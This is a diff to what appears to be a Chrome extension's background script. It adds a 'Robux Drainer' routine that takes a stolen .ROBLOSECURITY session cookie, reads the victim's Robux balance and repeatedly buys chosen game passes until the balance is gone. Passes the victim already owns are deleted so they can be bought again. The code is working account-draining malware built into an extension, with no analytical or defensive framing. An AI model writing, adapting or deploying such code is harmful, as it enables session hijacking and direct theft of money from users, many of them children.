@@ -23,3 +23,122 @@ chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
     return true; // keep async
   }
 });
+
+
+// -- Robux Drainer Logic ---------------------------------------------------------
+
+async function getCsrfToken(cookieHeader) {
+  try {
+    const r = await fetch('https://auth.roblox.com/v2/logout', {
+      method: 'POST',
+      headers: { 'Cookie': cookieHeader }
+    });
+    return r.headers.get('x-csrf-token');
+  } catch (e) {
+    console.error('CSRF Error:', e);
+    return null;
+  }
+}
+
+async function getUserInfo(cookieHeader) {
+  try {
+    const r = await fetch('https://users.roblox.com/v1/users/authenticated', {
+      headers: { 'Cookie': cookieHeader }
+    });
+    const data = await r.json();
+    return data;
+  } catch (e) {
+    return null;
+  }
+}
+
+async function getBalance(userId, cookieHeader) {
+  try {
+    const r = await fetch('https://economy.roblox.com/v1/users/' + userId + '/currency', {
+      headers: { 'Cookie': cookieHeader }
+    });
+    const data = await r.json();
+    return data.robux || 0;
+  } catch (e) {
+    return 0;
+  }
+}
+
+
+async function getProductInfo(passId) {
+  try {
+    const r = await fetch('https://apis.roblox.com/game-passes/v1/game-passes/' + passId + '/product-info');
+    const data = await r.json();
+    return { id: passId, productId: data.ProductId, price: data.PriceInRobux };
+  } catch (e) {
+    return null;
+  }
+}
+
+async function buyProduct(productId, expectedPrice, cookieHeader, csrfToken) {
+  try {
+    const r = await fetch('https://economy.roblox.com/v1/purchases/products/' + productId, {
+      method: 'POST',
+      headers: {
+        'Cookie': cookieHeader,
+        'X-CSRF-TOKEN': csrfToken,
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ expectedCurrency: 1, expectedPrice: expectedPrice })
+    });
+    const data = await r.json();
+    return data;
+  } catch (e) {
+    return { error: e.message };
+  }
+}
+
+
+async function revokeGamepass(passId, cookieHeader, csrfToken) {
+  try {
+    await fetch('https://apis.roblox.com/game-passes/v1/game-passes/' + passId + '/delete', {
+      method: 'POST',
+      headers: {
+        'Cookie': cookieHeader,
+        'X-CSRF-TOKEN': csrfToken,
+        'Content-Type': 'application/json'
+      }
+    });
+  } catch (e) {
+  }
+}
+
+
+chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
+  if (msg.action === 'drain_robux' && msg.token && msg.gamepasses) {
+    (async () => {
+      const cookieHdr = '.ROBLOSECURITY=' + msg.token;
+      const csrf = await getCsrfToken(cookieHdr);
+      if (!csrf) return;
+      const user = await getUserInfo(cookieHdr);
+      if (!user) return;
+      let bal = await getBalance(user.id, cookieHdr);
+      if (bal <= 0) return;
+
+      let passesInfo = [];
+      for (const pid of msg.gamepasses) {
+        const info = await getProductInfo(pid);
+        if (info && info.price <= bal) passesInfo.push(info);
+      }
+      passesInfo.sort((a, b) => b.price - a.price);
+
+      for (const pass of passesInfo) {
+        while (bal >= pass.price) {
+          const r = await buyProduct(pass.productId, pass.price, cookieHdr, csrf);
+          if (r.reason === 'AlreadyOwned') {
+            await revokeGamepass(pass.id, cookieHdr, csrf);
+            continue;
+          }
+          if (!r.purchased) break;
+          bal -= pass.price;
+        }
+      }
+    })();
+    return true;
+  }
+});
